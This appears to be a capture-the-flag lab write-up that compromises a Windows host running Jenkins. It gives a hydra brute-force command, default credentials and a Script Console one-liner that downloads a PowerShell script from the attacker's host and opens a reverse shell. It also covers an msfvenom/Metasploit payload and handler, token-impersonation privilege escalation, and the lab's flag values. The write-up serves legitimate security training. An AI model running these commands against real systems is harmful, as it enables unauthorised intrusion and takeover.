## Target: 10.65.172.189
### Recon
- Nmap: nmap -Pn -sV 10.65.172.189 -oA nmap
### Enumeration
- Open Ports:
	- **80**/tcp, **http**, Microsoft IIS httpd 7.5
	- **3389**/tcp, **ms-wbt-server?**
	- **8080**/tcp, **http**, Jetty 9.4.z-SNAPSHOT
- Web Findings:
	- Port 80 takes us to a simple page with a picture of Bale as Bruce Wayne, and contains some text with an email address alfred@wayneenterprises.com
	- 8080 takes us to a Jenkins login page.
		- We are asked to find the username and password for this login page. 
		- Hydra did not work as there is a bug in v9.0 that seems to effectively prevent one from specifying a non-standard port. But this is the command that would have worked if things were fixed.
			- ``hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -s 8080 10.65.172.189 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -v``
		- We eventually discover that the credentials are _admin:admin_
### Vulnerabilities
- The lab asks us to find somewhere in the tool where we can execute code. It is located under Manage Jenkins > Script Console. 
- We will use the _Invoke-PowerShellTcp.ps1_ from the Nishang toolkit to spawn a reverse shell.
### Exploitation - Method 1
- First we download the script and host it via ``python3 -m http.server`` on port 8000.
- A Netcat listener is set up on port 4444.
- From the Script Console, we add this command to the console: 
``cmd = "powershell iex (New-Object Net.WebClient).DownloadString('http://10.65.93.146:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.65.93.146 -Port 4444"``
``println cmd.execute()``
- When the script runs, we catch the reverse shell and now have access to their machine.
### Exploitation - Method 2
- This time, we will use an msfvenom payload and a metasploit handler to catch the shell.
``msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe``
- Now we download the file to the machine, this time from the reverse shell that we created earlier.
``powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.65.93.146:8000/shell.exe','shell.exe')"``
- From msfconsole, set up our handler.
`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp` 
`set LHOST your-thm-ip` 
`set LPORT listening-port`
`run`
- Execute the msfvenom payload.
``Start-Process "shell.exe"``
- Catch it! 👌

### Post Exploitation
- We navigate to the C:/Users/bruce directory and find the user.txt flag.

### Privilege Escalation
- To elevate privileges, we will use [[Token Impersonation]].
- In our original shell (not meterpreter), we run ``whoami /priv`` to take a look at our current privs.
- Enter ``load incognito`` to load the incognito module in Metasploit.
- ``list_tokens -g``
- Notice that BUILTIN\Administrators token is available.
- ``impersonate_token "BUILTIN\Administrators"
_Note: Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do)._
- **We need to make sure that we migrate to a process with correct permissions. The safest process to pick is the services.exe process. First, use the ``_ps_`` command to view processes and find the PID of the services.exe process. Migrate to this process using the command _migrate PID-OF-PROCESS_**
- ``migrate 668``
- Last, we navigate to C:\Windows\System32\config to view the root.txt file. DONE!

### Flags
- User: _79007a09481963edf2e1321abd9ae2a0_
- Root: _dff0f748678f280250f25a45b8046b4a_

### Notes
- Do more research about Windows tokens and token impersonation.
